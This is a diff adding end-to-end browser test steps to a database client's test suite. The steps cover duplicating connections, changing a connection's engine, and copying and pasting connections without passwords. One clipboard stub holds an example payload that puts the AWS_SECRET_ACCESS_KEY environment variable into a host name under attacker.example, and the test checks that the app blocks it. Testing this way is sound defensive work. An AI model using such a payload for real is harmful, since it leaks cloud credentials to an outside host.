@@ -2367,6 +2367,130 @@ where variable_name = 'Ssl_cipher' and variable_value <> '';`,
     assert.equal(await settings.getByLabel("Pattern", { exact: true }).inputValue(), "{database|host}");
   });
 
+  step("duplicate a repository connection: next to the original, every setting kept, opened to edit");
+  const mysqlFile = join(demo, ".spelaion", "connections", "docker", "mysql.toml");
+  const mysqlCopyFile = join(demo, ".spelaion", "connections", "docker", "mysql-copy.toml");
+  await (await connectionMenu("MySQL (Docker)")).getByRole("button", { name: "Duplicate" }).click();
+  wizard = page.locator(".modal.wizard");
+  await wizard.getByRole("heading", { name: "Edit MySQL (Docker) (copy)" }).waitFor();
+  await wizard.getByRole("status").filter({ hasText: "is a copy of “MySQL (Docker)”, already saved" }).waitFor();
+  await shot("13d-duplicated-connection");
+  assert.equal(
+    readFileSync(mysqlCopyFile, "utf8"),
+    readFileSync(mysqlFile, "utf8").replace('name = "MySQL (Docker)"', 'name = "MySQL (Docker) (copy)"'),
+  );
+  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
+  await wizard.waitFor({ state: "detached" });
+  await page.locator(".connection-row", { hasText: "MySQL (Docker) (copy)" }).waitFor();
+
+  step("change a connection's engine: MySQL → MariaDB, shown before saving, its sessions closed");
+  panel = await newQuery("MySQL (Docker) (copy)", "select version() as v;");
+  await run(panel);
+  await page.getByRole("dialog").getByText("Password for MySQL (Docker) (copy)").waitFor();
+  await page.getByLabel("Password", { exact: true }).fill("spelaion");
+  await page.getByRole("button", { name: "Connect", exact: true }).click();
+  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
+  assert.match(await panel.locator(".status-connected").innerText(), /8\.4\./);
+  await (await connectionMenu("MySQL (Docker) (copy)")).getByRole("button", { name: "Edit…" }).click();
+  wizard = page.locator(".modal.wizard");
+  await wizard.getByRole("heading", { name: "Edit MySQL (Docker) (copy)" }).waitFor();
+  assert.equal(await wizard.getByLabel("Engine", { exact: true }).inputValue(), "mysql");
+  await wizard.getByLabel("Engine", { exact: true }).selectOption("mariadb");
+  const summary = wizard.getByRole("status", { name: "Engine change" });
+  await summary.getByText("Engine: MySQL → MariaDB. Nothing is saved until you save.").waitFor();
+  await summary.getByText(/^Kept: host, port, database, user, password, TLS mode, environment\.$/).waitFor();
+  assert.equal(await summary.getByText(/^(Changed|Removed|To fill in):/).count(), 0);
+  await shot("13e-engine-change");
+  // The copy keeps MySQL's port; MariaDB is the next container.
+  assert.equal(await wizard.getByLabel("Port", { exact: true }).inputValue(), "13306");
+  await wizard.getByLabel("Port", { exact: true }).fill("13307");
+  await wizard.getByLabel("Name", { exact: true }).fill("MariaDB (copy)");
+  await wizard.getByRole("button", { name: "Save changes" }).click();
+  await wizard.waitFor({ state: "detached" });
+  await page.locator(".connection-row", { hasText: "MariaDB (copy)" }).waitFor();
+  const changedCopy = readFileSync(mysqlCopyFile, "utf8");
+  assert.match(changedCopy, /^engine = "mariadb"$/m);
+  assert.match(changedCopy, /^port = 13307$/m);
+  assert.match(changedCopy, /^# MySQL from testing\/docker/m, "the file's comments stay");
+  assert.match(changedCopy, /\[tls\]\nmode = "require"/);
+  // The tab was closed with its old session: it connects to the new engine when run.
+  await panel.locator(".status-connected").waitFor({ state: "detached" });
+  await run(panel);
+  await page.getByRole("dialog").getByText("Password for MariaDB (copy)").waitFor();
+  await page.getByLabel("Password", { exact: true }).fill("spelaion");
+  await page.getByRole("button", { name: "Connect", exact: true }).click();
+  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
+  assert.match(await panel.locator(".status-connected").innerText(), /MariaDB/);
+  // Its own write: the repository copy was pinned, no review is asked.
+  assert.equal(await page.getByRole("dialog", { name: "This changed since you trusted the repository" }).count(), 0);
+
+  step("copy and paste a connection: no password on the clipboard, pasted as a personal connection");
+  const copyRow = page.locator(".connection-row", { hasText: "MariaDB (copy)" });
+  const copiedBefore = await page.evaluate(() => window.__copied.length);
+  await copyRow.locator(".label").click();
+  await page.keyboard.press("Control+c");
+  const connectionText = await copied(copiedBefore + 1);
+  assert.match(connectionText, /^engine = "mariadb"$/m);
+  assert.match(connectionText, /secret = "prompt"/);
+  assert.doesNotMatch(connectionText, /keychain|spelaion"\s*\n\s*password = "/);
+  await page.locator(".row-note", { hasText: "“MariaDB (copy)” copied, without its password." }).waitFor();
+  // Delete the repository copy (the clipboard keeps its text), then paste it back.
+  await (await connectionMenu("MariaDB (copy)")).getByRole("button", { name: "Delete…" }).click();
+  const deleteCopy = page.getByRole("dialog", { name: "Delete connection?" });
+  await deleteCopy.getByRole("button", { name: "Delete", exact: true }).click();
+  await deleteCopy.waitFor({ state: "detached" });
+  await copyRow.waitFor({ state: "detached" });
+  assert.ok(!existsSync(mysqlCopyFile));
+  // Ctrl+V in the explorer: its paste event carries the text.
+  await page.locator(".connection-row", { hasText: "Shop (SQLite)" }).locator(".label").click();
+  await page.evaluate((text) => {
+    const data = new DataTransfer();
+    data.setData("text/plain", text);
+    document.activeElement.dispatchEvent(new ClipboardEvent("paste", { clipboardData: data, bubbles: true, cancelable: true }));
+  }, connectionText);
+  wizard = page.locator(".modal.wizard");
+  await wizard.getByRole("heading", { name: "Edit MariaDB (copy)" }).waitFor();
+  await wizard.getByRole("status").filter({ hasText: "was pasted as a personal connection" }).waitFor();
+  await shot("13f-pasted-connection");
+  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
+  await wizard.waitFor({ state: "detached" });
+  const pastedFile = join(userDir, "connections", "mariadb-copy.toml");
+  const pastedText = readFileSync(pastedFile, "utf8");
+  assert.match(pastedText, /engine = "mariadb"/);
+  assert.match(pastedText, /secret = "prompt"/);
+  assert.ok(!existsSync(mysqlCopyFile), "a paste never writes to the repository");
+  // "Paste connection" from the menu reads the clipboard; untrusted text cannot read secrets.
+  await page.evaluate(() => {
+    navigator.clipboard.readText = () =>
+      Promise.resolve('schema_version = 1\nengine = "mysql"\nhost = "${env:AWS_SECRET_ACCESS_KEY}.attacker.example"\nuser = "u"\n');
+  });
+  const pastedRow = page.locator(".connection-row", { hasText: "MariaDB (copy)" });
+  await pastedRow.click({ button: "right" });
+  await page.getByRole("menuitem", { name: "Paste connection" }).click();
+  await page.getByRole("alert").filter({ hasText: "a pasted connection cannot use ${env:AWS_SECRET_ACCESS_KEY}" }).waitFor();
+  await page.evaluate((text) => (navigator.clipboard.readText = () => Promise.resolve(text)), connectionText);
+  await pastedRow.click({ button: "right" });
+  await page.getByRole("menuitem", { name: "Paste connection" }).click();
+  wizard = page.locator(".modal.wizard");
+  await wizard.getByRole("heading", { name: "Edit MariaDB (copy) (copy)" }).waitFor();
+  await wizard.getByRole("button", { name: "Cancel", exact: true }).click();
+  await wizard.waitFor({ state: "detached" });
+  // The pasted connection connects like the original, asking for its password.
+  panel = await newQuery("MariaDB (copy) (copy)", "select version() as v;");
+  await run(panel);
+  await page.getByRole("dialog").getByText("Password for MariaDB (copy) (copy)").waitFor();
+  await page.getByLabel("Password", { exact: true }).fill("spelaion");
+  await page.getByRole("button", { name: "Connect", exact: true }).click();
+  await panel.locator(".statusline", { hasText: "1 row" }).waitFor();
+  assert.match(await panel.locator(".status-connected").innerText(), /MariaDB/);
+  for (const name of ["MariaDB (copy) (copy)", "MariaDB (copy)"]) {
+    await (await connectionMenu(name)).getByRole("button", { name: "Delete…" }).click();
+    const confirmDelete = page.getByRole("dialog", { name: "Delete connection?" });
+    await confirmDelete.getByRole("button", { name: "Delete", exact: true }).click();
+    await confirmDelete.waitFor({ state: "detached" });
+  }
+  await page.locator(".connection-row", { hasText: "MariaDB (copy)" }).waitFor({ state: "detached" });
+
   step("SSH tunnel editor: two hops with keys, tested, used by a new connection");
   await page.getByRole("button", { name: "Add connection", exact: true }).first().click();
   wizard = page.locator(".modal.wizard").first();
@@ -2878,6 +3002,8 @@ where variable_name = 'Ssl_cipher' and variable_value <> '';`,
   }
 } finally {
   writeFileSync(shopFile, shopOriginal);
+  // A copy the run made in the demo repository, if a failure left it behind.
+  for (const copy of ["mysql-copy.toml", "mysql-copy-2.toml"]) rmSync(join(demo, ".spelaion", "connections", "docker", copy), { force: true });
   await browser.close().catch(() => {});
   await stopApp();
   // WebView2 lets go of its profile (inside userDir) a moment after the app exits.
